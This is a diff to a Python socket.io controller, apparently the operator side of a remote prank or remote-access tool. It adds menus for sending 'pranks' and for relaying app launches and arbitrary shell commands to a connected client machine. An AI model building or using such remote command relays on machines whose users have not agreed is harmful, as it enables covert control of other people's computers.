@@ -83,14 +83,46 @@ def client_list(data):
                         sio.emit('prank', {'to': selected_client, 'prank': 'fright'})
                     case "4":
                         sio.emit('prank', {'to': selected_client, 'prank': 'move mouse randomly'})
+                    case _:
+                        print("Error: Unknow option. Return to menu...")
+                        menu()
+                menu()
             case 4:
-                print("Enter the command: ")
-                command = str(input(""))
-                sio.emit("command_sent", {'to': selected_client, 'command': 'command'})
+                print("Select an option:")
+                print("1 - install app")
+                print("2 - open app")
+                print("3 - enter command")
+                print("0 - return to meno")
+                selected_command = int(input())
+                match(selected_command):
+                    case 1: 
+                        print("Não funfa :3")
+                        menu()
+                    case 2:
+                         while(True):
+                            print("Enter the app name: ")
+                            command = "start /B " + str(input(""))
+                            if(command == 'exit'):
+                                menu()
+                            sio.emit("command_sent", {'to': selected_client, 'command':  command})
+                    case 3: 
+                        while(True):
+                            print("Enter the command or exit to cancel: ")
+                            command = str(input(""))
+                            if(command == 'exit'):
+                                menu()
+                            sio.emit("command_sent", {'to': selected_client, 'command':  command})
+                    case 0: 
+                        menu()
+                    case _:
+                        ... 
+                        print("Error: Unknow option, return to menu...")
+                        menu()    
             case 0:
                 menu()
     else:
         print("No clients connected.")
+        menu()
 
 @sio.event
 def private_message(data):
